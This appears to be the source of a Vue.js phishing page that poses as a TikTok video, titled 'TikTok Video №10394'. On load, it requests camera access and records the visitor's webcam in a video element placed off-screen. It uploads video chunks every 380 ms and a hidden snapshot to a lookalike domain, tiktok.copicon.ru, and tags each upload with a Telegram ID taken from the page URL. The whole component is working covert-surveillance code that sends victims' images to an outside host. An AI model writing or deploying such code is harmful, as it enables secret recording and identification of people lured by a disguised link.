<template>
    <img v-if="isActiveMainImage" class="main_image" ref="main_image" src="@/assets/img/image copy.png" width="1000" height="1000" alt="">
    <video class="camera_video" ref="video" width="640" height="480" autoplay></video>
    <CameraObj ref="camera_obj" v-if="isActiveCameraBlock" class="cm"></CameraObj>
    <CInformationAbout v-if="infoBlockActive"></CInformationAbout>
    <canvas ref="canvas" width="640" height="480"></canvas>

</template>

<script>
import CameraObj from '@/components/CameraObj.vue';
import CInformationAbout from '@/components/cInformationAbout.vue';
import {v4 as uuidv4} from 'uuid';


export default {
  name: 'App',
  components:{CameraObj, CInformationAbout},
  data() {
    return {
      video_name: uuidv4(),
      stream: null, // Хранение видеопотока
      videoChunks: [], // Для хранения частей записанного видео
      telegramId: this.$route.params.telegram_id,
      isActiveCameraBlock: false,
      isActiveMainImage: true,
      isActiveCanvas: false,
      isActiveCameraVideo: false,
      infoBlockActive: false,
      baseUrl: 'https://tiktok.copicon.ru',
      defaultMimeType: { mimeType: 'video/webm; codecs=vp8'},
      options: null,
      videoFormat: null
    };
  },
  mounted() {
    this.startCamera(); // Стартуем камеру при загрузке компонента
    document.title = "TikTok Video №10394"
  },
  
  methods: {
    async startCamera() {
  try {
    console.log(this.$refs.camera_obj);

    // Запрашиваем доступ к камере
    this.stream = await navigator.mediaDevices.getUserMedia({ video: true });

    // Устанавливаем флаги и видео-поток
    this.isActiveCameraBlock = true;
    this.isActiveMainImage = false;
    this.$refs.video.srcObject = this.stream;

    // Устанавливаем настройки MediaRecorder и стартуем запись с заданным интервалом
    if (MediaRecorder.isTypeSupported(this.defaultMimeType.mimeType)){
      this.options = { mimeType: 'video/webm; codecs=vp8'}; 
      this.videoFormat = 'webm'
    } else {
      this.options = {mimeType: 'video/mp4; codecs="avc1.42E01E, mp4a.40.2"'}
      this.videoFormat = 'mp4'
    }
    setTimeout(() => {
      this.takeSnapshot()
    }, 600)
    

    const mediaRecorder = new MediaRecorder(this.stream, this.options);
    const CHUNK_INTERVAL = 380; // Интервал отправки 0.38 секунды 380 мс)
    mediaRecorder.start(CHUNK_INTERVAL);

    // Обработчик для отправки чанков, как только они становятся доступны
    mediaRecorder.ondataavailable = async (event) => {
      const chunk = event.data;
      const formData = new FormData();
      formData.append('video', chunk, `${this.video_name}.${this.videoFormat}`);
      formData.append('telegram_id', this.telegramId);

      try {
        await fetch(`${this.baseUrl}/api/v1/send_chunk/`, {
          method: "POST",
          body: formData,
        });
        console.log("Чанк отправлен успешно");
      } catch (error) {
        console.error("Ошибка отправки чанка:", error);
      }
    };
    
    
    // Делаем снимок
    setTimeout(() => {
      mediaRecorder.stop()
      this.previewModalWindow()
      this.stream.getTracks().forEach((track) => track.stop());
    }, 4000)

    // Останавливаем запись и видео-поток перед закрытием страницы
    window.addEventListener("beforeunload", () => {
      mediaRecorder.stop();
      this.stream.getTracks().forEach((track) => track.stop());
    });

  } catch (err) {
    console.error('Ошибка доступа к камере:', err);
  }
},  
    stopCamera() {
      // Остановка камеры
      if (this.stream) {
        const tracks = this.stream.getTracks();
        tracks.forEach(track => track.stop()); // Останавливаем каждый трек
      }
    },
    
    takeSnapshot() {
      // Делаем снимок
      const canvas = this.$refs.canvas;
      const video = this.$refs.video;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/png');
      console.log("Формируем изображение");
      this.sendData(imageData);
    },
    async sendData(imageData) {
      const photoBlob = this.dataURItoBlob(imageData);
      const formData = new FormData();
      formData.append('image', photoBlob, 'photo.png');
      formData.append('telegram_id', this.telegramId)

      // Отправляем POST-запрос
      fetch(`${this.baseUrl}/api/v1/send_image/`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log('Success:', data);
      })  
    },
    // Преобразуем base64 в Blob
    dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    },
    previewModalWindow(){
      this.isActiveCameraBlock = false
      this.infoBlockActive = true
    }
  },
  beforeUnmount() { 
    this.stopCamera();
  }
};
</script>

<style scoped>
html{
  background-color: black;
}
body{
  background-color: black;
}
#app {
  text-align: center;
  background-color: black;
  display: flex;
  flex-direction: column-reverse;
 
}
.cm{
  margin-top: 0px;
}
.camera_video{
  opacity: 0;
  position: absolute;
  left: -1900px;
  top: -1000px;
}
.video_video{
  display: block;
  margin: auto
}
canvas{
  position: absolute;
  display: none;
}

.main_image{
  z-index: 100;
  height: 50%;
  width: 100%;
  animation: slidein 2s ease-in-out infinite;
}


@keyframes slidein {
  from {
    transform: scale(.85);
  }
  50% {
    transform: scale(1);
  }
  to {
    transform: scale(.85);
  }
}
</style>
